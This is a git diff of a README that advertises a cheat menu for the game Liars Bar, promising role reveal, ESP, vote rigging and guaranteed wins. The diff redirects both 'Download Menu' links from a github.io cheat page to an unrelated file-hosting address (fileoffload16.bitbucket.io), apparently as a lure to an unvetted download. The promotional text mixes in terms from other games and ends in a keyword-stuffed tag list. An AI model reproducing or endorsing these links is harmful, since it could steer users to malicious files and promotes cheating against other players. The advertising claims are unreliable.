@@ -4,7 +4,7 @@
 
 In **Liars Bar**, lying, bluffing, and deduction are your main weapons—but what if you had a secret edge that turns every round into a guaranteed win? The **Liars Bar Cheat Menu** is your undercover toolkit to dominate every match like a mastermind. Whether you're a crewmate, killer, or something in between, this menu bends the rules in your favor 👀
 
-[![Download Menu](https://img.shields.io/badge/Download-Menu-blueviolet)](https://wecheaters.github.io/cheats/liars-bar/)
+[![Download Menu](https://img.shields.io/badge/Download-Menu-blueviolet)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 🕹️ What Is Liars Bar?
@@ -13,7 +13,7 @@ In **Liars Bar**, lying, bluffing, and deduction are your main weapons—but wha
 
 But hey—what if you already **knew** who everyone was? That’s where this **cheat menu** comes in 🧠
 
-[![Download Menu](https://i.ytimg.com/vi/Q1qnjpeyH2o/maxresdefault.jpg)](https://wecheaters.github.io/cheats/liars-bar/)
+[![Download Menu](https://i.ytimg.com/vi/Q1qnjpeyH2o/maxresdefault.jpg)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 💼 What the Cheat Menu Does
@@ -113,3 +113,4 @@ Get ready to become the most feared player in the room. Lies? You're now the arc
 Liars Bar cheat menu, role reveal cheat, Liars Bar ESP, vote hack Liars Bar, auto win script, cheat UI for Liars Bar, logic bypass mod, mind reading cheat, Liars Bar wallhack, vote rig script, social deduction cheat, game modifier Liars Bar, cheat engine Liars Bar, role switch cheat, controller cheat menu, stealth ESP Liars Bar, cheat loader, Liars Bar role ESP, custom scripts Liars Bar
 
 ---
+
